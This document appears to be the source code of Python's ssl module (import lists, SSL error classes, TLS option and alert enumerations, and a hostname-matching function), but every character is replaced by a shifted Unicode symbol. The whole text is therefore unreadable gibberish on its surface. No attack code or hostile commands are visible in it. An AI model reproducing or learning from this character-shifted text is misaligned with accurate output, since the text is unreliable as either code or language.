ꛐꛝꛞꛔꛚꛙꛪꛔꛙꛑꛚꚷꚫꛚꛛꛐꛙꛞꛞꛗꛪꛡꛐꛝꛞꛔꛚꛙꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꛪꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛘ꛰꛸꛺꛽꜄ꛍꛔꛚꚷꚫꛞꛞꛗꛞ꛰꛾꛾꛴꛺꛹ꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꚳꚕꚫꚫꚫꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚷꚫꛞꛞꛗꛥ꛰꛽꛺ꛝ꛰꛿꜀꛽꛹ꛐ꛽꛽꛺꛽ꚷꚫꛞꛞꛗꛢꛬ꛹꛿ꛝ꛰ꛬꛯꛐ꛽꛽꛺꛽ꚷꚫꛞꛞꛗꛢꛬ꛹꛿ꛢ꛽꛴꛿꛰ꛐ꛽꛽꛺꛽ꚷꚕꚫꚫꚫꚫꛞꛞꛗꛞ꜄꛾ꛮꛬ꛷꛷ꛐ꛽꛽꛺꛽ꚷꚫꛞꛞꛗꛐꛚꛑꛐ꛽꛽꛺꛽ꚷꚫꛞꛞꛗꛎ꛰꛽꛿ꛡ꛰꛽꛴꛱꛴ꛮꛬ꛿꛴꛺꛹ꛐ꛽꛽꛺꛽ꚕꚫꚫꚫꚫꚴꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛿꜃꛿ꚽ꛺ꛭ꛵ꚫꛬ꛾ꚫꛪ꛿꜃꛿ꚽ꛺ꛭ꛵ꚷꚫ꛹꛴ꛯꚽ꛺ꛭ꛵ꚫꛬ꛾ꚫꛪ꛹꛴ꛯꚽ꛺ꛭ꛵ꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꛝꛌꛙꛏꛪ꛾꛿ꛬ꛿꜀꛾ꚷꚫꛝꛌꛙꛏꛪꛬꛯꛯꚷꚫꛝꛌꛙꛏꛪꛭ꜄꛿꛰꛾ꚷꚫꛝꛌꛙꛏꛪ꛻꛾꛰꜀ꛯ꛺ꛪꛭ꜄꛿꛰꛾ꚕ꛿꛽꜄ꛅꚕꚫꚫꚫꚫ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꛝꛌꛙꛏꛪ꛰꛲ꛯꚕ꛰꜃ꛮ꛰꛻꛿ꚫꛔ꛸꛻꛺꛽꛿ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚮꚫꛗ꛴ꛭ꛽꛰ꛞꛞꛗꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꚫꛝꛌꛙꛏꛪ꛰꛲ꛯꚕꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꚳꚕꚫꚫꚫꚫꛓꛌꛞꛪꛞꛙꛔꚷꚫꛓꛌꛞꛪꛐꛎꛏꛓꚷꚫꛓꛌꛞꛪꛙꛛꛙꚷꚫꛓꛌꛞꛪꛌꛗꛛꛙꚷꚫꛓꛌꛞꛪꛞꛞꛗ꜁ꚽꚷꚫꛓꛌꛞꛪꛞꛞꛗ꜁ꚾꚷꚫꛓꛌꛞꛪꛟꛗꛞ꜁ꚼꚷꚕꚫꚫꚫꚫꛓꛌꛞꛪꛟꛗꛞ꜁ꚼꛪꚼꚷꚫꛓꛌꛞꛪꛟꛗꛞ꜁ꚼꛪꚽꚷꚫꛓꛌꛞꛪꛟꛗꛞ꜁ꚼꛪꚾꚕꚴꚕ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫꛪꛏꛐꛑꛌꛠꛗꛟꛪꛎꛔꛛꛓꛐꛝꛞꚷꚫꛪꛚꛛꛐꛙꛞꛞꛗꛪꛌꛛꛔꛪꛡꛐꛝꛞꛔꛚꛙꚕꚕꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚲꛪꛞꛞꛗꛘ꛰꛿꛳꛺ꛯꚲꚷꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫ꛹ꛬ꛸꛰ꛅꚫ꛹ꛬ꛸꛰ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛛꛝꛚꛟꛚꛎꛚꛗꛪꚲꚴꚫꛬ꛹ꛯꚫ꛹ꛬ꛸꛰ꚫꚬꛈꚫꚲꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚽꚾꚲꚷꚕꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛈꛪ꛾꛾꛷ꚴꚕꚕꛪꛔ꛹꛿ꛑ꛷ꛬ꛲ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚲꛚ꛻꛿꛴꛺꛹꛾ꚲꚷꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫ꛹ꛬ꛸꛰ꛅꚫ꛹ꛬ꛸꛰ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛚꛛꛪꚲꚴꚷꚕꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛈꛪ꛾꛾꛷ꚴꚕꚕꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚲꛌ꛷꛰꛽꛿ꛏ꛰꛾ꛮ꛽꛴꛻꛿꛴꛺꛹ꚲꚷꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫ꛹ꛬ꛸꛰ꛅꚫ꛹ꛬ꛸꛰ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛌꛗꛐꛝꛟꛪꛏꛐꛞꛎꛝꛔꛛꛟꛔꛚꛙꛪꚲꚴꚷꚕꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛈꛪ꛾꛾꛷ꚴꚕꚕꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚲꛞꛞꛗꛐ꛽꛽꛺꛽ꛙ꜀꛸ꛭ꛰꛽ꚲꚷꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫ꛹ꛬ꛸꛰ꛅꚫ꛹ꛬ꛸꛰ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꚲꚴꚷꚕꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛈꛪ꛾꛾꛷ꚴꚕꚕꛪꛔ꛹꛿ꛑ꛷ꛬ꛲ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚲꛡ꛰꛽꛴꛱꜄ꛑ꛷ꛬ꛲꛾ꚲꚷꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫ꛹ꛬ꛸꛰ꛅꚫ꛹ꛬ꛸꛰ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛡꛐꛝꛔꛑꛤꛪꚲꚴꚷꚕꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛈꛪ꛾꛾꛷ꚴꚕꚕꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚲꛡ꛰꛽꛴꛱꜄ꛘ꛺ꛯ꛰ꚲꚷꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫ꛹ꛬ꛸꛰ꛅꚫ꛹ꛬ꛸꛰ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛎꛐꛝꛟꛪꚲꚴꚷꚕꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛈꛪ꛾꛾꛷ꚴꚕꚕꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚽꚾꚫꛈꚫꛪꛞꛞꛗꛘ꛰꛿꛳꛺ꛯꚹꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚽꚾꚫꛈꚫꛪꛞꛞꛗꛘ꛰꛿꛳꛺ꛯꚹꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꚕꛪꛛꛝꛚꛟꛚꛎꛚꛗꛪꛙꛌꛘꛐꛞꚫꛈꚫ꜆꜁ꛬ꛷꜀꛰ꛅꚫ꛹ꛬ꛸꛰ꚫ꛱꛺꛽ꚫ꛹ꛬ꛸꛰ꚷꚫ꜁ꛬ꛷꜀꛰ꚫ꛴꛹ꚫꛪꛞꛞꛗꛘ꛰꛿꛳꛺ꛯꚹꛪꛪ꛸꛰꛸ꛭ꛰꛽꛾ꛪꛪꚹ꛴꛿꛰꛸꛾ꚳꚴ꜈ꚕꚕꛪꛞꛞꛗ꜁ꚽꛪꛔꛑꛪꛐꛣꛔꛞꛟꛞꚫꛈꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳꛪꛞꛞꛗꛘ꛰꛿꛳꛺ꛯꚷꚫꚲꛛꛝꛚꛟꛚꛎꛚꛗꛪꛞꛞꛗ꜁ꚽꚲꚷꚫꛙ꛺꛹꛰ꚴꚕꚕꚕꛋꛪ꛾꛴꛸꛻꛷꛰ꛪ꛰꛹꜀꛸ꚳꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚴꚕꛮ꛷ꛬ꛾꛾ꚫꛟꛗꛞꛡ꛰꛽꛾꛴꛺꛹ꛅꚕꚫꚫꚫꚫꛘꛔꛙꛔꛘꛠꛘꛪꛞꛠꛛꛛꛚꛝꛟꛐꛏꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛘꛔꛙꛔꛘꛠꛘꛪꛞꛠꛛꛛꛚꛝꛟꛐꛏꚕꚫꚫꚫꚫꛞꛞꛗ꜁ꚾꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛞꛞꛗ꜁ꚾꚕꚫꚫꚫꚫꛟꛗꛞ꜁ꚼꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛟꛗꛞ꜁ꚼꚕꚫꚫꚫꚫꛟꛗꛞ꜁ꚼꛪꚼꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛟꛗꛞ꜁ꚼꛪꚼꚕꚫꚫꚫꚫꛟꛗꛞ꜁ꚼꛪꚽꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛟꛗꛞ꜁ꚼꛪꚽꚕꚫꚫꚫꚫꛟꛗꛞ꜁ꚼꛪꚾꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛟꛗꛞ꜁ꚼꛪꚾꚕꚫꚫꚫꚫꛘꛌꛣꛔꛘꛠꛘꛪꛞꛠꛛꛛꛚꛝꛟꛐꛏꚫꛈꚫꛪ꛾꛾꛷ꚹꛛꛝꛚꛟꛚꛪꛘꛌꛣꛔꛘꛠꛘꛪꛞꛠꛛꛛꛚꛝꛟꛐꛏꚕꚕꚕꛋꛪ꛾꛴꛸꛻꛷꛰ꛪ꛰꛹꜀꛸ꚳꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚴꚕꛮ꛷ꛬ꛾꛾ꚫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛹꛿꛰꛹꛿ꚫ꛿꜄꛻꛰꛾ꚫꚳ꛽꛰ꛮ꛺꛽ꛯꚫ꛷ꛬ꜄꛰꛽ꚴꚕꚕꚫꚫꚫꚫꛞ꛰꛰ꚫꛝꛑꛎꚫꛃꚿꚿꛁꚷꚫ꛾꛰ꛮ꛿꛴꛺꛹ꚫꛍꚹꚼꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꛎꛓꛌꛙꛒꛐꛪꛎꛔꛛꛓꛐꛝꛪꛞꛛꛐꛎꚫꛈꚫꚽꚻꚕꚫꚫꚫꚫꛌꛗꛐꛝꛟꚫꛈꚫꚽꚼꚕꚫꚫꚫꚫꛓꛌꛙꛏꛞꛓꛌꛖꛐꚫꛈꚫꚽꚽꚕꚫꚫꚫꚫꛌꛛꛛꛗꛔꛎꛌꛟꛔꛚꛙꛪꛏꛌꛟꛌꚫꛈꚫꚽꚾꚕꚫꚫꚫꚫꚮꚫ꛻꛾꛰꜀ꛯ꛺ꚫꛮ꛺꛹꛿꛰꛹꛿ꚫ꛿꜄꛻꛰꛾ꚕꚫꚫꚫꚫꛓꛐꛌꛏꛐꛝꚫꛈꚫꚻ꜃ꚼꚻꚻꚕꚫꚫꚫꚫꛔꛙꛙꛐꛝꛪꛎꛚꛙꛟꛐꛙꛟꛪꛟꛤꛛꛐꚫꛈꚫꚻ꜃ꚼꚻꚼꚕꚕꚕꛋꛪ꛾꛴꛸꛻꛷꛰ꛪ꛰꛹꜀꛸ꚳꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚴꚕꛮ꛷ꛬ꛾꛾ꚫꛪꛟꛗꛞꛌ꛷꛰꛽꛿ꛟ꜄꛻꛰ꛅꚕꚫꚫꚫꚫꚭꚭꚭꛌ꛷꛰꛽꛿ꚫ꛿꜄꛻꛰꛾ꚫ꛱꛺꛽ꚫꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꚹꛌꛗꛐꛝꛟꚫ꛸꛰꛾꛾ꛬ꛲꛰꛾ꚕꚕꚫꚫꚫꚫꛞ꛰꛰ꚫꛝꛑꛎꚫꛃꚿꛁꛁꚷꚫ꛾꛰ꛮ꛿꛴꛺꛹ꚫꛍꚹꚽꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꛎꛗꛚꛞꛐꛪꛙꛚꛟꛔꛑꛤꚫꛈꚫꚻꚕꚫꚫꚫꚫꛠꛙꛐꛣꛛꛐꛎꛟꛐꛏꛪꛘꛐꛞꛞꛌꛒꛐꚫꛈꚫꚼꚻꚕꚫꚫꚫꚫꛍꛌꛏꛪꛝꛐꛎꛚꛝꛏꛪꛘꛌꛎꚫꛈꚫꚽꚻꚕꚫꚫꚫꚫꛏꛐꛎꛝꛤꛛꛟꛔꛚꛙꛪꛑꛌꛔꛗꛐꛏꚫꛈꚫꚽꚼꚕꚫꚫꚫꚫꛝꛐꛎꛚꛝꛏꛪꛚꛡꛐꛝꛑꛗꛚꛢꚫꛈꚫꚽꚽꚕꚫꚫꚫꚫꛏꛐꛎꛚꛘꛛꛝꛐꛞꛞꛔꛚꛙꛪꛑꛌꛔꛗꛠꛝꛐꚫꛈꚫꚾꚻꚕꚫꚫꚫꚫꛓꛌꛙꛏꛞꛓꛌꛖꛐꛪꛑꛌꛔꛗꛠꛝꛐꚫꛈꚫꚿꚻꚕꚫꚫꚫꚫꛙꛚꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚫꛈꚫꚿꚼꚕꚫꚫꚫꚫꛍꛌꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚫꛈꚫꚿꚽꚕꚫꚫꚫꚫꛠꛙꛞꛠꛛꛛꛚꛝꛟꛐꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚫꛈꚫꚿꚾꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛝꛐꛡꛚꛖꛐꛏꚫꛈꚫꚿꚿꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛐꛣꛛꛔꛝꛐꛏꚫꛈꚫꚿꛀꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛠꛙꛖꛙꛚꛢꛙꚫꛈꚫꚿꛁꚕꚫꚫꚫꚫꛔꛗꛗꛐꛒꛌꛗꛪꛛꛌꛝꛌꛘꛐꛟꛐꛝꚫꛈꚫꚿꛂꚕꚫꚫꚫꚫꛠꛙꛖꛙꛚꛢꛙꛪꛎꛌꚫꛈꚫꚿꛃꚕꚫꚫꚫꚫꛌꛎꛎꛐꛞꛞꛪꛏꛐꛙꛔꛐꛏꚫꛈꚫꚿꛄꚕꚫꚫꚫꚫꛏꛐꛎꛚꛏꛐꛪꛐꛝꛝꛚꛝꚫꛈꚫꛀꚻꚕꚫꚫꚫꚫꛏꛐꛎꛝꛤꛛꛟꛪꛐꛝꛝꛚꛝꚫꛈꚫꛀꚼꚕꚫꚫꚫꚫꛐꛣꛛꛚꛝꛟꛪꛝꛐꛞꛟꛝꛔꛎꛟꛔꛚꛙꚫꛈꚫꛁꚻꚕꚫꚫꚫꚫꛛꛝꛚꛟꛚꛎꛚꛗꛪꛡꛐꛝꛞꛔꛚꛙꚫꛈꚫꛂꚻꚕꚫꚫꚫꚫꛔꛙꛞꛠꛑꛑꛔꛎꛔꛐꛙꛟꛪꛞꛐꛎꛠꛝꛔꛟꛤꚫꛈꚫꛂꚼꚕꚫꚫꚫꚫꛔꛙꛟꛐꛝꛙꛌꛗꛪꛐꛝꛝꛚꛝꚫꛈꚫꛃꚻꚕꚫꚫꚫꚫꛔꛙꛌꛛꛛꛝꛚꛛꛝꛔꛌꛟꛐꛪꛑꛌꛗꛗꛍꛌꛎꛖꚫꛈꚫꛃꛁꚕꚫꚫꚫꚫꛠꛞꛐꛝꛪꛎꛌꛙꛎꛐꛗꛐꛏꚫꛈꚫꛄꚻꚕꚫꚫꚫꚫꛙꛚꛪꛝꛐꛙꛐꛒꛚꛟꛔꛌꛟꛔꛚꛙꚫꛈꚫꚼꚻꚻꚕꚫꚫꚫꚫꛘꛔꛞꛞꛔꛙꛒꛪꛐꛣꛟꛐꛙꛞꛔꛚꛙꚫꛈꚫꚼꚻꛄꚕꚫꚫꚫꚫꛠꛙꛞꛠꛛꛛꛚꛝꛟꛐꛏꛪꛐꛣꛟꛐꛙꛞꛔꛚꛙꚫꛈꚫꚼꚼꚻꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛠꛙꛚꛍꛟꛌꛔꛙꛌꛍꛗꛐꚫꛈꚫꚼꚼꚼꚕꚫꚫꚫꚫꛠꛙꛝꛐꛎꛚꛒꛙꛔꛥꛐꛏꛪꛙꛌꛘꛐꚫꛈꚫꚼꚼꚽꚕꚫꚫꚫꚫꛍꛌꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛞꛟꛌꛟꛠꛞꛪꛝꛐꛞꛛꛚꛙꛞꛐꚫꛈꚫꚼꚼꚾꚕꚫꚫꚫꚫꛍꛌꛏꛪꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛓꛌꛞꛓꛪꛡꛌꛗꛠꛐꚫꛈꚫꚼꚼꚿꚕꚫꚫꚫꚫꛠꛙꛖꛙꛚꛢꛙꛪꛛꛞꛖꛪꛔꛏꛐꛙꛟꛔꛟꛤꚫꛈꚫꚼꚼꛀꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛝꛐꛜꛠꛔꛝꛐꛏꚫꛈꚫꚼꚼꛁꚕꚫꚫꚫꚫꛙꛚꛪꛌꛛꛛꛗꛔꛎꛌꛟꛔꛚꛙꛪꛛꛝꛚꛟꛚꛎꛚꛗꚫꛈꚫꚼꚽꚻꚕꚕꚕꛋꛪ꛾꛴꛸꛻꛷꛰ꛪ꛰꛹꜀꛸ꚳꛪꛔ꛹꛿ꛐ꛹꜀꛸ꚴꚕꛮ꛷ꛬ꛾꛾ꚫꛪꛟꛗꛞꛘ꛰꛾꛾ꛬ꛲꛰ꛟ꜄꛻꛰ꛅꚕꚫꚫꚫꚫꚭꚭꚭꛘ꛰꛾꛾ꛬ꛲꛰ꚫ꛿꜄꛻꛰꛾ꚫꚳ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚴꚕꚕꚫꚫꚫꚫꛞ꛰꛰ꚫꛝꛑꛎꚫꛃꚿꚿꛁꚷꚫ꛾꛰ꛮ꛿꛴꛺꛹ꚫꛍꚹꚾꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꛓꛐꛗꛗꛚꛪꛝꛐꛜꛠꛐꛞꛟꚫꛈꚫꚻꚕꚫꚫꚫꚫꛎꛗꛔꛐꛙꛟꛪꛓꛐꛗꛗꛚꚫꛈꚫꚼꚕꚫꚫꚫꚫꛞꛐꛝꛡꛐꛝꛪꛓꛐꛗꛗꛚꚫꛈꚫꚽꚕꚫꚫꚫꚫꛓꛐꛗꛗꛚꛪꛡꛐꛝꛔꛑꛤꛪꛝꛐꛜꛠꛐꛞꛟꚫꛈꚫꚾꚕꚫꚫꚫꚫꛙꛐꛢꛞꛐꛞꛞꛔꛚꛙꛪꛟꛔꛎꛖꛐꛟꚫꛈꚫꚿꚕꚫꚫꚫꚫꛐꛙꛏꛪꛚꛑꛪꛐꛌꛝꛗꛤꛪꛏꛌꛟꛌꚫꛈꚫꛀꚕꚫꚫꚫꚫꛓꛐꛗꛗꛚꛪꛝꛐꛟꛝꛤꛪꛝꛐꛜꛠꛐꛞꛟꚫꛈꚫꛁꚕꚫꚫꚫꚫꛐꛙꛎꛝꛤꛛꛟꛐꛏꛪꛐꛣꛟꛐꛙꛞꛔꛚꛙꛞꚫꛈꚫꛃꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚫꛈꚫꚼꚼꚕꚫꚫꚫꚫꛞꛐꛝꛡꛐꛝꛪꛖꛐꛤꛪꛐꛣꛎꛓꛌꛙꛒꛐꚫꛈꚫꚼꚽꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛝꛐꛜꛠꛐꛞꛟꚫꛈꚫꚼꚾꚕꚫꚫꚫꚫꛞꛐꛝꛡꛐꛝꛪꛏꛚꛙꛐꚫꛈꚫꚼꚿꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛡꛐꛝꛔꛑꛤꚫꛈꚫꚼꛀꚕꚫꚫꚫꚫꛎꛗꛔꛐꛙꛟꛪꛖꛐꛤꛪꛐꛣꛎꛓꛌꛙꛒꛐꚫꛈꚫꚼꛁꚕꚫꚫꚫꚫꛑꛔꛙꛔꛞꛓꛐꛏꚫꛈꚫꚽꚻꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛠꛝꛗꚫꛈꚫꚽꚼꚕꚫꚫꚫꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꛪꛞꛟꛌꛟꛠꛞꚫꛈꚫꚽꚽꚕꚫꚫꚫꚫꛞꛠꛛꛛꛗꛐꛘꛐꛙꛟꛌꛗꛪꛏꛌꛟꛌꚫꛈꚫꚽꚾꚕꚫꚫꚫꚫꛖꛐꛤꛪꛠꛛꛏꛌꛟꛐꚫꛈꚫꚽꚿꚕꚫꚫꚫꚫꛙꛐꛣꛟꛪꛛꛝꛚꛟꛚꚫꛈꚫꛁꛂꚕꚫꚫꚫꚫꛘꛐꛞꛞꛌꛒꛐꛪꛓꛌꛞꛓꚫꛈꚫꚽꛀꚿꚕꚫꚫꚫꚫꛎꛓꛌꛙꛒꛐꛪꛎꛔꛛꛓꛐꛝꛪꛞꛛꛐꛎꚫꛈꚫꚻ꜃ꚻꚼꚻꚼꚕꚕꚕ꛴꛱ꚫ꛾꜄꛾ꚹ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚫꛈꛈꚫꚭ꜂꛴꛹ꚾꚽꚭꛅꚕꚫꚫꚫꚫ꛱꛽꛺꛸ꚫꛪ꛾꛾꛷ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛰꛹꜀꛸ꛪꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚷꚫ꛰꛹꜀꛸ꛪꛮ꛽꛷꛾ꚕꚕ꛱꛽꛺꛸ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛾꛺ꛮ꛶꛰꛿ꚷꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚷꚫꛮ꛽꛰ꛬ꛿꛰ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚕ꛱꛽꛺꛸ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛸꛻꛺꛽꛿ꚫꛞꛚꛗꛪꛞꛚꛎꛖꛐꛟꚷꚫꛞꛚꛪꛟꛤꛛꛐꚷꚫꛪꛒꛗꛚꛍꛌꛗꛪꛏꛐꛑꛌꛠꛗꛟꛪꛟꛔꛘꛐꛚꛠꛟꚕ꛴꛸꛻꛺꛽꛿ꚫ꛾꛺ꛮ꛶꛰꛿ꚫꛬ꛾ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚕ꛴꛸꛻꛺꛽꛿ꚫꛭꛬ꛾꛰ꛁꚿꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛱꛺꛽ꚫꛏꛐꛝꚸ꛿꛺ꚸꛛꛐꛘꚫ꛿꛽ꛬ꛹꛾꛷ꛬ꛿꛴꛺꛹ꚕ꛴꛸꛻꛺꛽꛿ꚫ꛰꛽꛽꛹꛺ꚕ꛴꛸꛻꛺꛽꛿ꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚕꚕꚕ꛾꛺ꛮ꛶꛰꛿ꛪ꛰꛽꛽꛺꛽ꚫꛈꚫꛚꛞꛐ꛽꛽꛺꛽ꚫꚫꚮꚫ꛶꛰꛰꛻ꚫ꛿꛳ꛬ꛿ꚫ꛻꜀ꛭ꛷꛴ꛮꚫ꛹ꛬ꛸꛰ꚫ꛴꛹ꚫ꛸꛺ꛯ꜀꛷꛰ꚫ꛹ꛬ꛸꛰꛾꛻ꛬꛮ꛰ꚕꚕꛎꛓꛌꛙꛙꛐꛗꛪꛍꛔꛙꛏꛔꛙꛒꛪꛟꛤꛛꛐꛞꚫꛈꚫꛦꚲ꛿꛷꛾ꚸ꜀꛹꛴꛼꜀꛰ꚲꛨꚕꚕꛓꛌꛞꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛎꛚꛘꛘꛚꛙꛪꛙꛌꛘꛐꚫꛈꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛾꛷ꚷꚫꚲꛓꛚꛞꛟꛑꛗꛌꛒꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛞꛠꛍꛕꛐꛎꛟꚲꚴꚕꚕꚕꛪꛝꛐꛞꛟꛝꛔꛎꛟꛐꛏꛪꛞꛐꛝꛡꛐꛝꛪꛎꛔꛛꛓꛐꛝꛞꚫꛈꚫꛪꛏꛐꛑꛌꛠꛗꛟꛪꛎꛔꛛꛓꛐꛝꛞꚕꚕꛎ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꛐ꛽꛽꛺꛽ꚫꛈꚫꛞꛞꛗꛎ꛰꛽꛿ꛡ꛰꛽꛴꛱꛴ꛮꛬ꛿꛴꛺꛹ꛐ꛽꛽꛺꛽ꚕꚕꚕꛯ꛰꛱ꚫꛪꛯ꛹꛾꛹ꛬ꛸꛰ꛪ꛸ꛬ꛿ꛮ꛳ꚳꛯ꛹ꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛘꛬ꛿ꛮ꛳꛴꛹꛲ꚫꛬꛮꛮ꛺꛽ꛯ꛴꛹꛲ꚫ꛿꛺ꚫꛝꛑꛎꚫꛁꚼꚽꛀꚷꚫ꛾꛰ꛮ꛿꛴꛺꛹ꚫꛁꚹꚿꚹꚾꚕꚕꚫꚫꚫꚫꚸꚫꛓ꛺꛾꛿꛹ꛬ꛸꛰꛾ꚫꛬ꛽꛰ꚫꛮ꛺꛸꛻ꛬ꛽꛰ꛯꚫ꛷꛺꜂꛰꛽ꚸꛮꛬ꛾꛰ꚹꚕꚫꚫꚫꚫꚸꚫꛑ꛺꛽ꚫꛔꛏꛙꛌꚷꚫꛭ꛺꛿꛳ꚫꛯ꛹ꚫꛬ꛹ꛯꚫ꛳꛺꛾꛿꛹ꛬ꛸